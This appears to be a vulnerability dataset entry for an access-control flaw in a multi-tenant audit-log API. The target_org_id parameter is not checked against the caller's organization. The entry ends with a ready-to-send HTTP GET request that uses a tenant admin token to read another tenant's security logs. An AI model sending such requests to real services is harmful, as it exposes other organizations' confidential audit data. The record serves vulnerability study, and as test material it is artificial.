diagnosis: The QuerySecurityLogs function retrieves audit log entries based on user-supplied targetOrgID and category without verifying that the caller is authorized for the target organization. An authenticated tenant administrator can dump security audit trails and user access logs of competing tenant organizations.
exploit_request:
GET /api/audit-logs?category=security_events&target_org_id=128 HTTP/1.1
Host: compliance.saas-security.io
Authorization: Bearer org_admin_token_5
Accept: application/json
